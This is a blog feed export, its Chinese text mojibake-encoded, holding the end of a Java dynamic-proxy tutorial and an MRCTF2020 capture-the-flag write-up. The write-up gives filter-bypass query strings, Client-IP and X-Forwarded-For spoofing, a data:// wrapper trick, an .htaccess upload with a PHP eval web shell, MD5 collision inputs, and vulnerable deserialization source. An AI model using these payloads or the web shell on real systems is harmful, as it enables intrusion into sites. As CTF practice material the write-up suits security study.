<h2 id="getClass-getName"><a href="#getClass-getName" class="headerlink" title="getClass().getName()"></a>getClass().getName()</h2><p>è¿™æ ·çš„ä¹Ÿå¾ˆç®€å•ç†è§£ï¼Œæˆ‘ä»¬å³ä½¿getClassäº†ï¼Œç¨‹åºå´ä¸çŸ¥é“å®ƒçš„åå­—ï¼Œç¨‹åºåªçŸ¥é“æ˜¯ä¸€ä¸ªç±»ï¼Œæ•…æˆ‘ä»¬ä½¿ç”¨getNameå³å¯å¾—åˆ°å½“å‰å®ä¾‹çš„ç±»çš„åå­—ï¼ˆStringå½¢å¼ï¼‰</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Demo1</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        myDemo wdnmd = <span class="keyword">new</span> myDemo();</span><br><span class="line"><span class="comment">//        System.out.println(myDemo);</span></span><br><span class="line">        System.out.println(wdnmd.getClass().getName());</span><br><span class="line"></span><br><span class="line">    &#125;;</span><br></pre></td></tr></table></figure>

<p>å¥½åƒå†™ä¸€ä¸ªåŠ¨æ€ä»£ç†ä¹Ÿå°±ç”¨åˆ°äº†è¿™äº›ï¼Œå˜›ï¼Œç»§ç»­å¾€ä¸‹å§</p>
<h1 id="åŠ¨æ€ä»£ç†"><a href="#åŠ¨æ€ä»£ç†" class="headerlink" title="åŠ¨æ€ä»£ç†"></a>åŠ¨æ€ä»£ç†</h1><h2 id="2-1-æ¥å£"><a href="#2-1-æ¥å£" class="headerlink" title="2.1 æ¥å£"></a>2.1 æ¥å£</h2><p>é¦–å…ˆå’Œé™æ€ä»£ç†æ˜¯ä¸€æ ·çš„ï¼Œæˆ‘ä»¬ä¹Ÿéœ€è¦æ„ç­‘ä¸€ä¸ªæ¥å£ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> myProxy2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">UserService</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">add</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">delete</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">update</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">query</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>åŒæ ·çš„ï¼Œä¸šåŠ¡å®ä½“æ˜¯ä¸å¯é¿å…çš„</p>
<h2 id="2-2å®ä½“ç±»ï¼š"><a href="#2-2å®ä½“ç±»ï¼š" class="headerlink" title="2.2å®ä½“ç±»ï¼š"></a>2.2å®ä½“ç±»ï¼š</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> myProxy2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserServiceImp</span> <span class="keyword">implements</span> <span class="title">UserService</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">add</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;å¢æ·»äº†ä¸€ä¸ªæ–°ç”¨æˆ·&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">delete</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;åˆ é™¤äº†ä¸€ä¸ªç”¨æˆ·&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">update</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;æ›´æ–°äº†ä¸€ä¸ªç”¨æˆ·&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">query</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;æŸ¥è¯¢äº†ä¸€ä¸ªç”¨æˆ·&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è€Œä»£ç†ç±»ï¼Œé€šè¿‡åŠ¨æ€ä»£ç†æˆ‘ä»¬å¯ä»¥ç›´æ¥çš„ç”Ÿæˆï¼Œå–æ¶ˆç¹ççš„æ“ä½œ</p>
<p>å¦‚æœç”¨é™æ€ä»£ç†ï¼Œæˆ‘ä»¬çš„ä»£ç†æ˜¯è¿™æ ·çš„ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> myProxy2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserServiceProxy</span> <span class="keyword">implements</span> <span class="title">UserService</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> UserServiceImp userServiceImp;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setUserServiceImp</span><span class="params">(UserServiceImp userServiceImp)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.userServiceImp = userServiceImp;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">add</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        log(<span class="string">&quot;add&quot;</span>);</span><br><span class="line">        userServiceImp.add();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">delete</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        log(<span class="string">&quot;åˆ é™¤&quot;</span>);</span><br><span class="line">        userServiceImp.delete();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">update</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        log(<span class="string">&quot;æ›´æ–°&quot;</span>);</span><br><span class="line">        userServiceImp.update();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">query</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        log(<span class="string">&quot;æŸ¥è¯¢&quot;</span>);</span><br><span class="line">        userServiceImp.query();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">log</span><span class="params">(String name)</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;[DEBUG]æ‰§è¡Œäº†&quot;</span>+name+<span class="string">&quot;æ–¹æ³•&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>è€Œä½¿ç”¨åŠ¨æ€ä»£ç†ä¹‹åï¼š</p>
<h2 id="2-3ä»£ç†ç±»"><a href="#2-3ä»£ç†ç±»" class="headerlink" title="2.3ä»£ç†ç±»"></a>2.3ä»£ç†ç±»</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> Demo3;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> myProxy2.UserServiceImp;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ProxyInvocationHandler</span> <span class="keyword">implements</span> <span class="title">InvocationHandler</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> UserServiceImp userServiceImp;</span><br><span class="line"></span><br><span class="line"><span class="comment">//    IOCï¼Œè®©ç”¨æˆ·è‡ªå®šä¹‰éœ€è¦ä»€ä¹ˆæ¥å£æ¥å†³å®šä»£ç†ç±»</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setUserServiceImp</span><span class="params">(UserServiceImp userServiceImp)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.userServiceImp = userServiceImp;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//    ç”Ÿæˆä»£ç†ç±»</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">getProxy</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> Proxy.newProxyInstance(<span class="keyword">this</span>.getClass().getClassLoader(),</span><br><span class="line">                userServiceImp.getClass().getInterfaces(),<span class="keyword">this</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//    å¿…é¡»é‡å†™çš„æ¥å£ï¼Œå¹¶è¿”å›æ¥å£</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line"></span><br><span class="line">        Object result = method.invoke(userServiceImp, args);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æˆ‘ä»¬å‘ç°ä¸å†éœ€è¦ä¸€ä¸ªä¸€ä¸ªå¥—æ¨¡æ¿å¾€ä¸Šå†™äº†ï¼Œå¦‚æœæˆ‘ä»¬éœ€è¦å¢æ·»æ–°åŠŸèƒ½ï¼Œåªéœ€è¦è¿™æ ·åšï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">    <span class="comment">//    å¿…é¡»é‡å†™çš„æ¥å£ï¼Œå¹¶è¿”å›æ¥å£</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">        log(method.getName());</span><br><span class="line">        Object result = method.invoke(userServiceImp, args);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">log</span><span class="params">(String name)</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;[DEBUG]ä½¿ç”¨äº†&quot;</span>+name+<span class="string">&quot;æ–¹æ³•&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>è™½ç„¶æˆ‘ä»¬å‰é¢å»å†™ç”Ÿæˆä¸€ä¸ªçš„ä»£ç é‡çœ‹ä¼¼å¾ˆå¤§ï¼Œä½†æ˜¯å®é™…ä¸Šè¿™æ®µä»£ç æ˜¯ä¸€ä¸ªå·¥å…·ç”¨çš„ä»£ç ï¼Œ<strong>æ˜¯å†™æ­»çš„ã€‚</strong>ä¸šåŠ¡ä»£ç ç›¸å½“çš„ç«¯ï¼Œä»å‡ åè¡Œéª¤å‡åˆ°åæ¥è¡Œï¼Œå¹¶ä¸”æˆ‘ä»¬çš„ä»£ç†ç±»ä¸ä¼šéšç€å·¥ç¨‹çš„å˜å¤§è€Œå˜å¤§ï¼Œæˆ‘ä»¬é€šè¿‡åå°„ä¹‹åè·å–äº†ç±»çš„æ–¹æ³•</p>
<p>è€Œæºç å½“ä¸­ï¼Œinvokeæ–¹æ³•å®é™…ä¸Šä¹Ÿæ˜¯é€šè¿‡setAccessibleæ¥å®ç°çš„</p>
<p><img src="image-20201110203729995.png" alt="image-20201110203729995"></p>
]]></content>
  </entry>
  <entry>
    <title>MRCTF2020</title>
    <url>/2020/10/29/MRCTF2020/</url>
    <content><![CDATA[<p>æ€ä¹ˆè¯´å‘¢ã€‚ã€‚æ˜¯æ–°æ‰‹é¢˜ç›®ï¼Œåˆä¸å¤ªåƒï¼Œæœ‰äº›é¢˜ç›®è„‘æ´æœ‰ç‚¹å¤§</p>
<h1 id="1-å¥—å¨ƒ"><a href="#1-å¥—å¨ƒ" class="headerlink" title="1.å¥—å¨ƒ"></a>1.å¥—å¨ƒ</h1><p>è¯»æºç ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$query = $_SERVER[<span class="string">&#x27;QUERY_STRING&#x27;</span>];</span><br><span class="line"></span><br><span class="line"> <span class="keyword">if</span>( substr_count($query, <span class="string">&#x27;_&#x27;</span>) !== <span class="number">0</span> || substr_count($query, <span class="string">&#x27;%5f&#x27;</span>) != <span class="number">0</span> )&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Y0u are So cutE!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"> <span class="keyword">if</span>($_GET[<span class="string">&#x27;b_u_p_t&#x27;</span>] !== <span class="string">&#x27;23333&#x27;</span> &amp;&amp; preg_match(<span class="string">&#x27;/^23333$/&#x27;</span>, $_GET[<span class="string">&#x27;b_u_p_t&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;you are going to the next ~&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å…¶ä¸­å¯ä»¥çœ‹è§è¿‡æ»¤_å’Œ%5fï¼Œé‚£æˆ‘ä»¬ç¼–ç ç»•è¿‡å°±æ— åŠæ³•äº†å•Šï¼Œä½†æ˜¯æ‰¾åˆ°å‚è€ƒæ–‡çŒ®ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.freebuf.com&#x2F;articles&#x2F;web&#x2F;213359.html</span><br></pre></td></tr></table></figure>

<p>å…¶ä¸­å¯¹è¿™ç§çš„ç»•è¿‡</p>
<p><img src="image-20201029175514743.png" alt="image-20201029175514743"></p>
<p>äºæ˜¯æˆ‘ä»¬æ„é€ ç©ºæ ¼æ¥ç»•è¿‡ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;?b%20u%20p%20t&#x3D;23333%0a</span><br></pre></td></tr></table></figure>

<p>ä¹‹ååœ¨secrettw.phpä¸­ï¼ŒJSfcukç¿»è¯‘å³å¯å¾—åˆ°è®©ä¼ å€¼è¯»å–æºç ï¼š</p>
<p><img src="image-20201029175921389.png" alt="image-20201029175921389"></p>
<p>è¯»å–åˆ°æºç å¦‚ä¸‹ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">error_reporting(<span class="number">0</span>); </span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;takeip.php&#x27;</span>;</span><br><span class="line">ini_set(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;.&#x27;</span>); </span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;Merak&#x27;</span>]))&#123; </span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>); </span><br><span class="line">    <span class="keyword">die</span>(); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">change</span>(<span class="params">$v</span>)</span>&#123; </span><br><span class="line">    $v = base64_decode($v); </span><br><span class="line">    $re = <span class="string">&#x27;&#x27;</span>; </span><br><span class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($v);$i++)&#123; </span><br><span class="line">        $re .= chr ( ord ($v[$i]) + $i*<span class="number">2</span> ); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> $re; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Local access only!&#x27;</span>.<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line">$ip = getIp();</span><br><span class="line"><span class="keyword">if</span>($ip!=<span class="string">&#x27;127.0.0.1&#x27;</span>)</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Sorry,you don&#x27;t have permission!  Your ip is :&quot;</span>.$ip;</span><br><span class="line"><span class="keyword">if</span>($ip === <span class="string">&#x27;127.0.0.1&#x27;</span> &amp;&amp; file_get_contents($_GET[<span class="string">&#x27;2333&#x27;</span>]) === <span class="string">&#x27;todat is a happy day&#x27;</span> )&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Your REQUEST is:&quot;</span>.change($_GET[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line"><span class="keyword">echo</span> file_get_contents(change($_GET[<span class="string">&#x27;file&#x27;</span>])); &#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>å…¶ä¸­å¯¹IPè¿›è¡Œäº†ä¸€æ¬¡checkï¼ŒXFFä¸å¯ç”¨ï¼Œç”¨Clinet-IPå³å¯ç»•è¿‡</p>
<p><img src="image-20201029180308506.png" alt="image-20201029180308506"></p>
<p>ä¹‹åçœ‹ä¸Šé¢çš„ç®€å•å‡½æ•°çš„é€†å‘ï¼ŒæŠŠåŠ å·æ”¹æˆå‡å·å°±è¡Œäº†</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$v = <span class="string">&quot;fj]a&amp;f\b&quot;</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">unchange</span>(<span class="params">$v</span>)</span>&#123;</span><br><span class="line">    $re = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($v);$i++)&#123;</span><br><span class="line">        $re .= chr ( ord ($v[$i]) - $i*<span class="number">2</span> );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $re;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">change</span>(<span class="params">$v</span>)</span>&#123;</span><br><span class="line">    $v = base64_decode($v);</span><br><span class="line">    $re = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($v);$i++)&#123;</span><br><span class="line">        $re .= chr ( ord ($v[$i]) + $i*<span class="number">2</span> );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $re;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> (change(<span class="string">&quot;ZmpdYSZmXGI=&quot;</span>));</span><br></pre></td></tr></table></figure>

<p>æ¯”è¾ƒæ¶å¿ƒåˆ°äººçš„æ˜¯2333çš„è¾“å‡ºï¼Œæˆ‘ä¹‹å‰æ— è®ºå¦‚ä½•è¾“å…¥éƒ½ä¸è¡Œï¼Œä¸€åº¦æ€€ç–‘äººç”Ÿï¼Œæœ€åæ‰¾åˆ°dataçš„ä¼ªåè®®å¯ä»¥ç»•è¿‡ï¼Œå‚è€ƒæ–‡ç« ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;blog.csdn.net&#x2F;nzjdsds&#x2F;article&#x2F;details&#x2F;82461043</span><br></pre></td></tr></table></figure>

<p>æœ€åæˆåŠŸæ‹¿åˆ°flagï¼Œflagåœ¨æºç ä¸­ï¼š</p>
<p><img src="image-20201029180627670.png" alt="image-20201029180627670"></p>
<h1 id="2-ä½ ä¼ ä½ ğŸå‘¢"><a href="#2-ä½ ä¼ ä½ ğŸå‘¢" class="headerlink" title="2.ä½ ä¼ ä½ ğŸå‘¢"></a>2.ä½ ä¼ ä½ ğŸå‘¢</h1><p>åˆ†åˆ«ä¸Šä¼ .htaccesså’Œä¸€å¥è¯å³å¯ï¼š</p>
<p><img src="image-20201029182056361.png" alt="image-20201029182056361"></p>
<p>ä¸€å¥è¯ç”¨aspçš„æ ¼å¼ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;script language=<span class="string">&quot;php&quot;</span>&gt;<span class="keyword">eval</span>($_POST[<span class="number">1</span>]);&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p><img src="image-20201029182147837.png" alt="image-20201029182147837"></p>
<p>ä¹‹åç”¨èšå‰‘ğŸ”—æ‹¿flagå³å¯ï¼Œè¿™é“é¢˜æˆ‘æ¯”è¾ƒå¥‡æ€ªçš„å°±æ˜¯è¿‡æ»¤äº†å¾ˆå¤šä¸œè¥¿ï¼Œä½†æ˜¯åˆæ²¡å•¥ç”¨,æˆ‘çŒœæµ‹æ˜¯å‡ºé¢˜äººè¿‡æ»¤ä¸å¤Ÿï¼Ÿä¸ç„¶å¯ä»¥ç”¨disable_functionçš„æ¥åšçš„,è¿‡æ»¤å¦‚ä¸‹ï¼škâ€™hâ€™j</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld	</span><br></pre></td></tr></table></figure>

<h1 id="3-Ez-bypass"><a href="#3-Ez-bypass" class="headerlink" title="3.Ez_bypass"></a>3.Ez_bypass</h1><p>MD5å¼ºç­‰äºç»•è¿‡å’Œå¼±ç­‰äºç»•è¿‡ï¼š</p>
<p><img src="image-20201029190823452.png" alt="image-20201029190823452"></p>
<p>å½“ç„¶ä¹Ÿå¯ä»¥ç”¨ä¸‹é¢è¿™ä¸¤ç»„æ•°ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">hexString1 = <span class="string">&#x27;4dc968ff0ee35c209572d4777b721587d36fa7b21bdc56b74a3dc0783e7b9518afbfa200a8284bf36e8e4b55b35f427593d849676da0d1555d8360fb5f07fea2&#x27;</span></span><br><span class="line">hexString2 = <span class="string">&#x27;4dc968ff0ee35c209572d4777b721587d36fa7b21bdc56b74a3dc0783e7b9518afbfa202a8284bf36e8e4b55b35f427593d849676da0d1d55d8360fb5f07fea2&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span> = M%C9h%FF%<span class="number">0</span>E%E3%<span class="number">5</span>C%<span class="number">20</span>%<span class="number">95</span>r%D4w%<span class="number">7</span>Br%<span class="number">15</span>%<span class="number">87</span>%D3o%A7%B2%<span class="number">1</span>B%DCV%B7J%<span class="number">3</span>D%C0x%<span class="number">3</span>E%<span class="number">7</span>B%<span class="number">95</span>%<span class="number">18</span>%AF%BF%A2%<span class="number">00</span>%A8%<span class="number">28</span>K%F3n%<span class="number">8</span>EKU%B3_Bu%<span class="number">93</span>%D8Igm%A0%D1U%<span class="number">5</span>D%<span class="number">83</span>%<span class="number">60</span>%FB_%<span class="number">07</span>%FE%A2</span><br><span class="line"><span class="number">2</span> = M%C9h%FF%<span class="number">0</span>E%E3%<span class="number">5</span>C%<span class="number">20</span>%<span class="number">95</span>r%D4w%<span class="number">7</span>Br%<span class="number">15</span>%<span class="number">87</span>%D3o%A7%B2%<span class="number">1</span>B%DCV%B7J%<span class="number">3</span>D%C0x%<span class="number">3</span>E%<span class="number">7</span>B%<span class="number">95</span>%<span class="number">18</span>%AF%BF%A2%<span class="number">02</span>%A8%<span class="number">28</span>K%F3n%<span class="number">8</span>EKU%B3_Bu%<span class="number">93</span>%D8Igm%A0%D1%D5%<span class="number">5</span>D%<span class="number">83</span>%<span class="number">60</span>%FB_%<span class="number">07</span>%FE%A2</span><br></pre></td></tr></table></figure>





<p>ç¬¬äºŒæ­¥ï¼›</p>
<p><img src="image-20201029190903989.png" alt="image-20201029190903989"></p>
<h1 id="4-PYWebsite"><a href="#4-PYWebsite" class="headerlink" title="4.PYWebsite"></a>4.PYWebsite</h1><p><img src="image-20201029190958345.png" alt="image-20201029190958345"></p>
<p>çœ‹åˆ°è¿™å¥è¯ï¼Œç›´æ¥ä¼ªé€ XFFå³å¯</p>
<p><img src="image-20201029191040967.png" alt="image-20201029191040967"></p>
<h1 id="5-Ezpop"><a href="#5-Ezpop" class="headerlink" title="5.Ezpop"></a>5.Ezpop</h1><p>é¦–å…ˆå®¡è®¡æºç ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag is in flag.php</span></span><br><span class="line"><span class="comment">//WTF IS THIS?</span></span><br><span class="line"><span class="comment">//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95</span></span><br><span class="line"><span class="comment">//And Crack It!</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  $var;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">append</span>(<span class="params">$value</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>($value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;append(<span class="keyword">$this</span>-&gt;var);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $source;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$file=<span class="string">&#x27;index.php&#x27;</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;source = $file;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Welcome to &#x27;</span>.<span class="keyword">$this</span>-&gt;source.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;str-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;</span>, <span class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;hacker&quot;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;source = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $p;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;p = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params">$key</span>)</span>&#123;</span><br><span class="line">        $function = <span class="keyword">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">return</span> $function();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;pop&#x27;</span>]))&#123;</span><br><span class="line">    @unserialize($_GET[<span class="string">&#x27;pop&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    $a=<span class="keyword">new</span> Show;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

